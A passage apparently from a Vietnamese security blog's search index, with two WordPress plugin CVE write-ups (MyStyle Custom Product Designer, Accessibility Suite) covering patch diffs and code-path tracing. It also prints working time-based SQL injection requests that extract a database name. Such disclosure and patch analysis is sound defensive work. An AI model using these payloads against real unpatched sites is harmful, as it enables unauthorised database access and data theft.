s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 